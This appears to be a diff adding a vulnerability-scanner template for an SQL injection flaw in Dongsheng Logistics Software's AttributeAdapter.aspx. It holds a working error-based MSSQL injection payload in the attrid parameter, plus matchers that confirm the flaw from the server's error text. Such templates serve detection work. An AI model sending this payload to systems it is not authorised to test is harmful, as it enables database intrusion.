@@ -1,0 +1,29 @@
+id: poc-yaml-dongshengsoft-attributeadapter-aspx-sqli
+info:
+  name: Dongsheng Logistics Software AttributeAdapter.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    software: Dongsheng Logistics Software
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1%27%20and%201=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%20-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
